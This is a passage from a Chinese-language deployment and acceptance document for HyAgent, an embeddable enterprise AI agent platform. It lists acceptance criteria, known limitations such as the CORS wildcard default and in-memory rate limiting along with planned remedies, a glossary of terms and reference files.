5. **執行環境** — PostgreSQL（含 pgvector）、HTTPS 網域、反向代理可信 IP 清單，以及 LLM 使用方式（雲端 Provider、租戶自帶金鑰或地端模型）。

### 7.3 驗收基準（摘要）

一次可供驗收的完整故事至少應通過：

1. 建立租戶並完成允許來源、外觀與 SSO 設定。
2. 核發 `pk_` Key 並將 Widget 嵌入白名單宿主站台。
3. 宿主登入者可透過 SSO 免輸入 HyAgent 密碼進入 Widget。
4. **不修改 Agent 編排核心**，即可建立客製表單、綁定測試 Integration，完成欄位映射與連線測試。
5. 使用者以自然語言完成該表單，可修改欄位、看摘要、明確確認並成功送出，取得標準化外部單號與狀態。
6. 未授權使用者無法使用受限服務或查到受限文件。
7. 上傳知識檔並設定可見性標籤後，查詢測試能反映不同帳號的實際可見範圍。
8. 具 `service:report` 權限者可建立報告、查看進度並下載可用格式。
9. 表單送出可觸發具 HMAC 簽章的 Webhook。
10. 管理者可查看用量、報告與稽核紀錄，且稽核能識別表單、Integration 與外部單號。
11. 跨租戶存取、無效 Token、未允許 Origin 與超出配額皆被後端拒絕並回明確錯誤。
12. 使用者可對回覆按讚／倒讚並選原因；管理者可在「回饋」分頁看到該則回覆的檢索紀錄與工具呼叫、以提問者身分重跑檢索，並標記已處理。

### 7.4 現階段限制與因應（誠實揭露）

為避免導入期落差，以下項目在正式上線前需一併處理：

| 項目 | 現況 | 因應建議 |
|---|---|---|
| 正式身分來源 | 嵌入路徑（Identity Assertion SSO）已可上線；HyAgent 自家帳密登入仍為開發名錄，production 預設關閉 | 正式使用者走 SSO；或串接企業 OIDC 建立穩定的外部帳號對應 |
| 通用外部系統串接 | 通用 HTTP 連接器與 schema 驅動映射已完成，目前唯一實作的 Adapter 為 OA，部分情境仍以 Stub 模擬送單與簽核 | 依 Connector Registry 方向將 OA 降為其中一個 Adapter，補齊憑證管理、錯誤映射、冪等、逾時重試與契約測試 |
| 外部簽核與附件 | 真實簽核狀態查詢與附件本體傳送尚待對方系統規格 | 取得目標系統的查詢與收附件方式後補齊；此三處需程式而非僅改設定 |
| 送出冪等 | 同一對話最多嘗試一次外部送出；逾時不自動重送 | 逾時情境須由管理人員核對外部單據後決定處理，不以重啟服務解鎖 |
| Webhook 佇列 | 目前為行內非同步重試 | 可靠度需求提高時改用持久化佇列 |
| 報告工作 | 同租戶一次一份，部分狀態存於記憶體 | 將工作狀態持久化並支援可控併發與恢復 |
| 限流計數 | 單程序記憶體計數，重啟即重置 | 多副本部署改用共用限流儲存或入口層限流 |
| File 後端 | 不適合多實例，部分資料重啟即失 | 正式環境一律使用 PostgreSQL 模式 |
| CORS 預設 | 預設租戶 `*` 為向後相容設定 | 正式環境收斂為明確白名單 |
| 附件儲存 | 直接存於資料庫，單檔上限 10 MB | 大量附件改用物件儲存並加入惡意檔案掃描 |
| API Key 生命週期 | 已以 SHA-256 雜湊保存，原始值僅顯示一次 | 補齊輪替、最後使用時間、到期政策與操作手冊 |

---

## 附錄：名詞對照

| 名詞 | 說明 |
|---|---|
| Tenant（租戶） | 一個企業或獨立整合方的資料與設定邊界 |
| Integration | 租戶可配置的系統整合定義，描述 HyAgent 如何透過 Connector 與外部系統交換資料與事件 |
| Connector | 實作統一送出介面的 Adapter，例如通用 HTTP、Webhook、特定產品 API 或 Stub |
| Credential Reference | 表單／Integration 對租戶加密憑證的參照，不含明文秘密 |
| Scope | 代表服務或資料能力的權限字串 |
| ACL | 對特定資源列出可存取主體或條件的存取控制清單 |
| RAG | 先檢索企業資料，再讓模型依命中內容回答或彙整 |
| Identity Assertion | 宿主站台以自家私鑰簽發的短效身分斷言，用於交換 HyAgent Session |
| Widget | 可嵌入外部網頁的 HyAgent 對話介面 |
| SDK | 供外部開發者呼叫 API、控制 Widget 與接收事件的工具包 |
| BFF | 面向前端的應用後端；HyAgent Server 同時承擔 Agent 編排與系統整合責任 |
| BYO Key | 租戶自行提供 LLM Provider API Key |
| Webhook | HyAgent 在事件發生後主動呼叫外部系統的 HTTP 通知 |

---

### 參考文件

- 《HyAgent 產品規格文件》[`PRODUCT_SPEC.md`](PRODUCT_SPEC.md)
- 《HyAgent 平台架構》[`ARCHITECTURE.md`](ARCHITECTURE.md)
- 《HyAgent 客戶端整合手冊》[`HyAgent客戶端整合手冊.md`](HyAgent客戶端整合手冊.md)
- 《SSO 契約》[`HANDOFF-SSO.md`](HANDOFF-SSO.md)
- 安全修正紀錄 [`SECURITY-FIXES.md`](SECURITY-FIXES.md)、[`../SECURITY-HARDENING.md`](../SECURITY-HARDENING.md)
- 互動式 API 契約：`/api/openapi.json`、`/api/docs`
